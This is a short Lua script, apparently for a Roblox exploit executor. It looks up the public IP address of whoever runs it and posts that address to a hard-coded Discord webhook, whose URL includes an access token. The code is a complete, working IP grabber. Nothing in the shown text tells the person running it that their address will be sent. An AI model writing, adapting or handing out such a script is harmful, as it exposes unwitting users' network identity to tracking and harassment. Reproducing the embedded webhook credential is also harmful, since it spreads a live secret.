local HttpService = game:GetService("HttpService")

local ip = game:HttpGet("https://api.ipify.org")

print("IP: " .. ip)

local payload = HttpService:JSONEncode({
    content = "IP: " .. ip
})

local res = request({
    Url = "https://discord.com/api/webhooks/1545129276406370334/KdwxJv0suRE5wOYyHORUSpDJ_jFCtOqcbeKQELbET-i1ENNX5n2XhVIAdrgL6Pug0SfW",
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = payload
})

print("Status: " .. res.StatusCode)
